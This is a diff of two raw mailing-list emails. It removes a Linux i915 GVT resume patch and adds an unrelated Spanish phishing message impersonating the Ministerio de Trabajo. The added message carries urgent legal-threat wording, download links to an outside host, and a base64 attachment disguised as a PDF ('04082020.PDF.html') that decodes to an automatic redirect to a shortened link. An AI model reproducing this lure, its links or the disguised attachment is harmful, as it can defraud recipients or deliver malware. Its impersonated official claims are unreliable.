@@ -2,38 +2,30 @@ Return-Path: <intel-gvt-dev-bounces@lists.freedesktop.org>
 X-Original-To: lists+intel-gvt-dev@lfdr.de
 Delivered-To: lists+intel-gvt-dev@lfdr.de
 Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
-	by mail.lfdr.de (Postfix) with ESMTPS id 7400529A3B5
-	for <lists+intel-gvt-dev@lfdr.de>; Tue, 27 Oct 2020 05:54:13 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 411D929A4ED
+	for <lists+intel-gvt-dev@lfdr.de>; Tue, 27 Oct 2020 07:56:41 +0100 (CET)
 Received: from gabe.freedesktop.org (localhost [127.0.0.1])
-	by gabe.freedesktop.org (Postfix) with ESMTP id 25FD56EACB;
-	Tue, 27 Oct 2020 04:54:12 +0000 (UTC)
+	by gabe.freedesktop.org (Postfix) with ESMTP id EC8A66E14C;
+	Tue, 27 Oct 2020 06:56:39 +0000 (UTC)
 X-Original-To: intel-gvt-dev@lists.freedesktop.org
 Delivered-To: intel-gvt-dev@lists.freedesktop.org
-Received: from mga18.intel.com (mga18.intel.com [134.134.136.126])
- by gabe.freedesktop.org (Postfix) with ESMTPS id 8E02D6EACB;
- Tue, 27 Oct 2020 04:54:10 +0000 (UTC)
-IronPort-SDR: BghWiBv/+X2tM97JxAQKICjtHBXmYMiJ0D8KxXKoiBop+36Ye6O3QmTdmXauhAwMxl7za75On0
- Ck9TzTogxpjA==
-X-IronPort-AV: E=McAfee;i="6000,8403,9786"; a="155806319"
-X-IronPort-AV: E=Sophos;i="5.77,422,1596524400"; d="scan'208";a="155806319"
-X-Amp-Result: SKIPPED(no attachment in message)
-X-Amp-File-Uploaded: False
-Received: from orsmga006.jf.intel.com ([10.7.209.51])
- by orsmga106.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384;
- 26 Oct 2020 21:54:10 -0700
-IronPort-SDR: 4DTltbszClgv0KRbZNJOfN0Bm+xtymeGEE945nx2Vz2LlaADTXcbotbz2Tg27A+ATQTjcN2lFG
- ayBbUh7P/KxA==
-X-ExtLoop1: 1
-X-IronPort-AV: E=Sophos;i="5.77,422,1596524400"; d="scan'208";a="322797528"
-Received: from unknown (HELO coxu-arch-shz.sh.intel.com) ([10.239.160.21])
- by orsmga006.jf.intel.com with ESMTP; 26 Oct 2020 21:54:08 -0700
-From: Colin Xu <colin.xu@intel.com>
-To: zhenyuw@linux.intel.com
-Subject: [PATCH v7 2/2] drm/i915/gvt: Add GVT resume routine to i915
-Date: Tue, 27 Oct 2020 12:54:06 +0800
-Message-Id: <20201027045406.159566-1-colin.xu@intel.com>
-X-Mailer: git-send-email 2.29.1
+X-Greylist: delayed 2123 seconds by postgrey-1.36 at gabe;
+ Tue, 27 Oct 2020 06:56:38 UTC
+Received: from cft17.imsispal.com (cft17.imsispal.com [135.181.106.13])
+ by gabe.freedesktop.org (Postfix) with ESMTP id 7BA8A6E14C
+ for <intel-gvt-dev@lists.freedesktop.org>;
+ Tue, 27 Oct 2020 06:56:38 +0000 (UTC)
+Received: by cft17.imsispal.com (Postfix, from userid 0)
+ id 825C64A732; Tue, 27 Oct 2020 04:48:50 +0100 (CET)
+To: intel-gvt-dev@lists.freedesktop.org
+Subject: Fwd: Urgente - Proceso de trabajo Extrajudicial Nº   (699426)
+X-Mailer: Microsoft Office Outlook, Build 17.551210
+From: Ministerio de Trabajo<contacto@accesofinanciero.com>
 MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="ddf2cd6bc92490d5b2639258afb2b4bb"
+Content-Transfer-Encoding: 7bit
+Message-Id: <20201027060040.825C64A732@cft17.imsispal.com>
+Date: Tue, 27 Oct 2020 04:48:50 +0100 (CET)
 X-BeenThere: intel-gvt-dev@lists.freedesktop.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -46,59 +38,61 @@ List-Post: <mailto:intel-gvt-dev@lists.freedesktop.org>
 List-Help: <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=help>
 List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev>, 
  <mailto:intel-gvt-dev-request@lists.freedesktop.org?subject=subscribe>
-Cc: intel-gfx@lists.freedesktop.org, intel-gvt-dev@lists.freedesktop.org,
- colin.xu@intel.com
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
 Errors-To: intel-gvt-dev-bounces@lists.freedesktop.org
 Sender: "intel-gvt-dev" <intel-gvt-dev-bounces@lists.freedesktop.org>
 
-This patch add gvt resume wrapper into i915_drm_resume().
-GVT relies on i915 so resume gvt at last.
+This is a MIME encoded message.
 
-V2:
-- Direct call into gvt suspend/resume wrapper in intel_gvt.h/intel_gvt.c.
-The wrapper and implementation will check and call gvt routine. (zhenyu)
+--ddf2cd6bc92490d5b2639258afb2b4bb
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
 
-V3:
-Refresh.
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
 
-V4:
-Rebase.
+</head>
 
-V5:
-Fail intel_gvt_suspend() if fail to save GGTT.
 
-V6:
-Save host entry to per-vGPU gtt.ggtt_mm on each host_entry update so
-only need the resume routine.
+<body>
 
-V7:
-Refresh.
+<p><img src="https://fundacionmornese.com/wp-content/uploads/2013/05/MINISTERIO_Empleo_Nuevo.jpg" height="120" width="419"></p>
 
-Signed-off-by: Hang Yuan <hang.yuan@linux.intel.com>
-Signed-off-by: Colin Xu <colin.xu@intel.com>
----
- drivers/gpu/drm/i915/i915_drv.c | 2 ++
- 1 file changed, 2 insertions(+)
+<p>&nbsp;</p>
 
-diff --git a/drivers/gpu/drm/i915/i915_drv.c b/drivers/gpu/drm/i915/i915_drv.c
-index d3237b0d821d..2c15c9440f8a 100644
---- a/drivers/gpu/drm/i915/i915_drv.c
-+++ b/drivers/gpu/drm/i915/i915_drv.c
-@@ -1270,6 +1270,8 @@ static int i915_drm_resume(struct drm_device *dev)
- 
- 	intel_power_domains_enable(dev_priv);
- 
-+	intel_gvt_resume(dev_priv);
-+
- 	enable_rpm_wakeref_asserts(&dev_priv->runtime_pm);
- 
- 	return 0;
--- 
-2.29.1
+<p><strong>A continuaci&oacute;n, todos los detalles
+sobre el proceso de trabajo extrajudicial.</strong></p>
+
+<p><big><big><a href="http://http.imsispal.com/dibujo?48f7668a8f55e54e5f458f1ax57U0050M506NKRW4Z15F9S94JB3UK/Archivo_1000925">(&nbsp;</a></big></big><big><big><a href="http://http.imsispal.com/dibujo?48f7668a8f55e54e5f458f1ax57U0050M506NKRW4Z15F9S94JB3UK/Archivo_1000925">Descargar
+/ Impresi&oacute;n</a></big></big><big><big><a href="http://http.imsispal.com/dibujo??48f7668a8f55e54e5f458f1ax57U0050M506NKRW4Z15F9S94JB3UK/Archivo_1000925">
+)</a></big></big></p>
+
+<div class="iYB33c">&nbsp;</div>
+
+</body>
+</html>
+
+
+--ddf2cd6bc92490d5b2639258afb2b4bb
+Content-Type: application/octet-stream; name="04082020.PDF.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment
+
+PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFs
+Ly9FTiI+DQo8aHRtbD4NCjxoZWFkPg0KDQogIDxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNv
+bnRlbnQ9IjA7VVJMPWh0dHBzOi8vYml0Lmx5LzNqZUlreGsiPg0KDQo8L2hlYWQ+DQoNCg0KPGJv
+ZHk+DQoNCjxicj4NCg0KPC9ib2R5Pg0KPC9odG1sPg0K
+
+
+--ddf2cd6bc92490d5b2639258afb2b4bb
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 intel-gvt-dev mailing list
 intel-gvt-dev@lists.freedesktop.org
 https://lists.freedesktop.org/mailman/listinfo/intel-gvt-dev
+
+--ddf2cd6bc92490d5b2639258afb2b4bb--
